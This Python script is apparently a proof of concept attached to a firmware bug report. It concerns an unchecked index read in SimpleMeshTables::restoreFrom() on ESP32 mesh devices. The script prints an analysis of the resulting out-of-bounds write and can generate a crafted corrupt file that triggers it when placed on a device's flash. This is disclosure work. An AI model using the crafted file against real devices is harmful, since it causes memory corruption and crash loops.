#!/usr/bin/env python3
"""
Bug #13 PoC — SimpleMeshTables::restoreFrom Loads Indexes Without Validation
=============================================================================
Affected: src/helpers/SimpleMeshTables.h — restoreFrom() method

Root cause
----------
restoreFrom() reads _next_idx and _next_ack_idx directly from a file
into int fields without any bounds validation:

    f.read((uint8_t *) &_next_idx, sizeof(_next_idx));       // no check!
    f.read((uint8_t *) &_next_ack_idx, sizeof(_next_ack_idx)); // no check!

If the file is corrupted (flash wear, incomplete write, bit-flip),
_next_idx could be any 32-bit integer value.  On the next hasSeen()
call, the code writes:

    memcpy(&_hashes[_next_idx * MAX_HASH_SIZE], hash, MAX_HASH_SIZE);

With MAX_HASH_SIZE=8 and MAX_PACKET_HASHES=128:
  - _hashes[] = 128 * 8 = 1024 bytes
  - _next_idx = 999 → offset = 999 * 8 = 7992 → 6968 bytes past array end
  - _next_ack_idx = 999 → _acks[999] → 3740 bytes past 256-byte array

This is a classic "trust the file" vulnerability.

Current status
--------------
restoreFrom() and saveTo() compile on all ESP32 targets (Heltec V4,
T114, T190, tracker, etc.).  They are public API on SimpleMeshTables
but no current firmware variant calls them yet — the hasSeen table is
treated as ephemeral (rebuilt after reboot).  However, persisting the
table across reboots is a reasonable optimisation, and the moment
someone adds `tables.restoreFrom(f)` to their setup(), the bug is
live on every ESP32 device.

Impact when triggered
---------------------
  - OOB write of 8 bytes (hash) into arbitrary offset in SimpleMeshTables
    object or adjacent memory
  - On ARM Cortex-M4: corrupts adjacent class members, vtable pointers,
    or stack → HardFault → reboot
  - Deterministic: the corrupted file is read on every boot → crash loop
    until flash is erased
  - All roles (repeater, room server, sensor, companion) on ESP32

This script creates a sample corrupted file to demonstrate the contents
that would trigger the OOB write.

How to use
----------
    python bug13-restorefrom-oob.py [--create-corrupt-file output.bin]
"""

import argparse
import struct
import sys


# ---------- constants from firmware ----------
MAX_HASH_SIZE      = 8
MAX_PACKET_HASHES  = 128
MAX_PACKET_ACKS    = 64
INT_SIZE           = 4   # sizeof(int) on 32-bit platform

# Array sizes
HASHES_SIZE     = MAX_PACKET_HASHES * MAX_HASH_SIZE   # 1024 bytes
ACKS_SIZE       = MAX_PACKET_ACKS * INT_SIZE           # 256 bytes

# File layout of saveTo():
#   _hashes[1024] + _next_idx[4] + _acks[256] + _next_ack_idx[4]
FILE_SIZE = HASHES_SIZE + INT_SIZE + ACKS_SIZE + INT_SIZE  # 1288 bytes


def analyze():
    """Print detailed analysis of the OOB write vulnerability."""
    print("=" * 65)
    print("Bug #13 — restoreFrom() Index Validation Analysis")
    print("=" * 65)

    print(f"\n--- File layout (saveTo/restoreFrom) ---")
    offset = 0
    print(f"  [{offset:>4d}..{offset + HASHES_SIZE - 1:>4d}]  _hashes[]       ({HASHES_SIZE} bytes)")
    offset += HASHES_SIZE
    print(f"  [{offset:>4d}..{offset + INT_SIZE - 1:>4d}]  _next_idx       ({INT_SIZE} bytes, int)")
    offset += INT_SIZE
    print(f"  [{offset:>4d}..{offset + ACKS_SIZE - 1:>4d}]  _acks[]         ({ACKS_SIZE} bytes)")
    offset += ACKS_SIZE
    print(f"  [{offset:>4d}..{offset + INT_SIZE - 1:>4d}]  _next_ack_idx   ({INT_SIZE} bytes, int)")
    offset += INT_SIZE
    print(f"  Total file size: {offset} bytes")

    print(f"\n--- Valid ranges ---")
    print(f"  _next_idx:     0..{MAX_PACKET_HASHES - 1}  (0..127)")
    print(f"  _next_ack_idx: 0..{MAX_PACKET_ACKS - 1}  (0..63)")

    print(f"\n--- OOB write scenarios ---")
    scenarios = [
        ("_next_idx", 128, HASHES_SIZE, MAX_HASH_SIZE, "_hashes"),
        ("_next_idx", 999, HASHES_SIZE, MAX_HASH_SIZE, "_hashes"),
        ("_next_idx", 0x7FFFFFFF, HASHES_SIZE, MAX_HASH_SIZE, "_hashes"),
        ("_next_ack_idx", 64, ACKS_SIZE, INT_SIZE, "_acks"),
        ("_next_ack_idx", 999, ACKS_SIZE, INT_SIZE, "_acks"),
    ]

    print(f"  {'Field':<16s}  {'Value':>12s}  {'Offset':>10s}  {'Array size':>10s}  {'OOB':>10s}")
    print(f"  {'─' * 16}  {'─' * 12}  {'─' * 10}  {'─' * 10}  {'─' * 10}")
    for field, val, arr_size, elem_size, arr_name in scenarios:
        offset = val * elem_size
        oob = offset - arr_size
        if oob < 0:
            oob_str = "in bounds"
        else:
            oob_str = f"+{oob} bytes"
        print(f"  {field:<16s}  {val:>12d}  {offset:>10d}  {arr_size:>10d}  {oob_str:>10s}")

    print(f"\n--- Worst case (_next_idx = 0x7FFFFFFF) ---")
    worst_offset = 0x7FFFFFFF * MAX_HASH_SIZE
    print(f"  _hashes[0x7FFFFFFF * 8] = byte offset 0x{worst_offset:X}")
    print(f"  On 32-bit platform: wraps to 0x{worst_offset & 0xFFFFFFFF:08X}")
    print(f"  Writes 8 bytes to arbitrary location in address space")
    print(f"  → HardFault, memory corruption, or crash")

    print(f"\n--- Negative values (_next_idx = -1) ---")
    neg_offset = (-1) * MAX_HASH_SIZE  # in 2's complement: wraps
    print(f"  _next_idx = -1 → offset = -1 * 8 = -8")
    print(f"  memcpy(&_hashes[-8], ...) → writes 8 bytes BEFORE array start")
    print(f"  Corrupts whatever is before _hashes in memory layout")

    print(f"\n--- Trigger conditions ---")
    print(f"  1. Flash wear: partial write during saveTo() (power loss mid-write)")
    print(f"  2. Bit-flip: single-bit error in _next_idx field")
    print(f"  3. Flash corruption: filesystem metadata error")
    print(f"  4. Deliberate: attacker with physical access modifies flash")

    print(f"\n--- Current status ---")
    print(f"  restoreFrom()/saveTo() compile on all ESP32 targets")
    print(f"  Public API but no firmware variant calls them yet")
    print(f"  Bug is latent — live the moment persist/restore is added")

    print(f"\n--- Boot loop risk ---")
    print(f"  If the corrupted file is restored on every boot:")
    print(f"  boot → restoreFrom() → hasSeen() → OOB write → crash → reboot")
    print(f"  → infinite crash loop until flash is manually erased")


def create_corrupt_file(filename: str):
    """Create a sample corrupted SimpleMeshTables file."""
    # Build a file that would trigger OOB on first hasSeen() call
    data = bytearray()

    # _hashes: fill with zeros (valid, benign)
    data.extend(b'\x00' * HASHES_SIZE)

    # _next_idx: corrupt value (999 → offset 7992, way past 1024-byte array)
    data.extend(struct.pack('<i', 999))

    # _acks: fill with zeros
    data.extend(b'\x00' * ACKS_SIZE)

    # _next_ack_idx: also corrupt
    data.extend(struct.pack('<i', 999))

    assert len(data) == FILE_SIZE

    with open(filename, 'wb') as f:
        f.write(data)

    print(f"[*] Created corrupt file: {filename} ({len(data)} bytes)")
    print(f"[*] _next_idx = 999  (valid: 0-127)")
    print(f"    → first hasSeen() writes to _hashes[999*8 = 7992]")
    print(f"    → 6968 bytes past end of 1024-byte _hashes array")
    print(f"[*] _next_ack_idx = 999  (valid: 0-63)")
    print(f"    → first ACK hasSeen() writes to _acks[999]")
    print(f"    → 3740 bytes past end of 256-byte _acks array")
    print(f"[*] Upload this to the device's flash filesystem to trigger the bug")


def main():
    ap = argparse.ArgumentParser(description="Bug #13 — restoreFrom OOB write PoC")
    ap.add_argument("--analyze", action="store_true", default=True,
                    help="Print vulnerability analysis (default)")
    ap.add_argument("--create-corrupt-file", metavar="FILE", default=None,
                    help="Create a corrupt SimpleMeshTables file for testing")
    args = ap.parse_args()

    if args.create_corrupt_file:
        create_corrupt_file(args.create_corrupt_file)
    else:
        analyze()


if __name__ == "__main__":
    main()
